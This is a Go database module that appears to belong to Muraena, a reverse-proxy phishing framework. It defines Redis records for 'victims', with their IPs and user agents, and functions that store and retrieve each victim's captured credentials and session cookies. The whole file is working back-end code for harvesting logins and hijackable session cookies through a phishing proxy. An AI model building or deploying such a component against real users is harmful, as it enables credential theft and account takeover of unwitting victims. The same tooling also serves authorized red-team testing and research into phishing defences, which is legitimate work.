package db

import (
	"fmt"
	"github.com/gomodule/redigo/redis"
	"log"
)

// Victim identifies a browser that interacts with Muraena

// KEY scheme:
// victim:<ID>
type Victim struct {
	ID           string `redis:"id"`
	IP           string `redis:"ip"`
	UA           string `redis:"ua"`
	FirstSeen    string `redis:"fseen"`
	LastSeen     string `redis:"lseen"`
	RequestCount int    `redis:"reqCount"`

	CredsCount int    `redis:"creds_count"`
	CookieJar  string `redis:"cookiejar_id"`
}

// a victim has at least one set of credentials
// KEY scheme:
// victim:<ID>:creds:<COUNT>
type VictimCredential struct {
	Key   string `redis:"key"`
	Value string `redis:"val"`
	Time  string `redis:"time"`
}

// a victim has N cookies associated with its web session
// KEY scheme:
// victim:<ID>:cookiejar:<COOKIE_NAME>
type VictimCookie struct {
	Name     string `redis:"name"`
	Value    string `redis:"value"`
	Domain   string `redis:"domain"`
	Expires  string `redis:"expires"`
	Path     string `redis:"path"`
	HTTPOnly bool   `redis:"httpOnly"`
	Secure   bool   `redis:"secure"`
	Session  bool   `redis:"session"` // is the cookie a session cookie?
}

func StoreVictim(id string, victim *Victim) error {

	rc := RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", id)

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(victim)...); err != nil {
		log.Printf("error doing redis HMSET: %s. victim not saved.", err)
		return err
	}

	// push the victimId
	_, err := rc.Do("RPUSH", "victims", id)
	if err != nil {
		return err
	}

	return nil
}

func GetAllVictims() ([]string, error) {
	rc := RedisPool.Get()
	defer rc.Close()

	values, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
	if err != nil {
		return nil, err
	}

	return values, nil
}

func StoreVictimCreds(id string, victim *VictimCredential) error {

	rc := RedisPool.Get()
	defer rc.Close()

	v, err := GetVictim(id)
	if err != nil {
		return err
	}

	// store the credentials
	key := fmt.Sprintf("victim:%s:creds:%d", id, v.CredsCount)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(victim)...); err != nil {
		log.Printf("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	// increase the credentials count
	// TODO implement this with REDIS HINCRBY
	key = fmt.Sprintf("victim:%s", id)
	increment := make(map[string]string)
	increment["creds_count"] = fmt.Sprintf("%d", v.CredsCount+1)

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(increment)...); err != nil {
		log.Printf("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	return nil
}

func GetVictimCreds(victimId string, index int) (*VictimCredential, error) {
	rc := RedisPool.Get()
	defer rc.Close()

	var v VictimCredential
	vid := fmt.Sprintf("victim:%s:creds:%d", victimId, index)

	value, err := redis.Values(rc.Do("HGETALL", vid))
	if err != nil {
		return nil, err
	}

	err = redis.ScanStruct(value, &v)
	if err != nil {
		return nil, err
	}

	return &v, nil
}

func StoreVictimCookie(id string, cookie *VictimCookie) error {

	rc := RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s:cookiejar:%s", id, cookie.Name)

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(cookie)...); err != nil {
		log.Printf("error doing redis HMSET: %s. victim cookie not saved.", err)
		return err
	}

	return nil
}

func GetVictim(id string) (*Victim, error) {

	rc := RedisPool.Get()
	defer rc.Close()

	var v Victim
	vid := fmt.Sprintf("victim:%s", id)

	value, err := redis.Values(rc.Do("HGETALL", vid))
	if err != nil {
		return nil, err
	}

	err = redis.ScanStruct(value, &v)
	if err != nil {
		return nil, err
	}

	return &v, nil
}
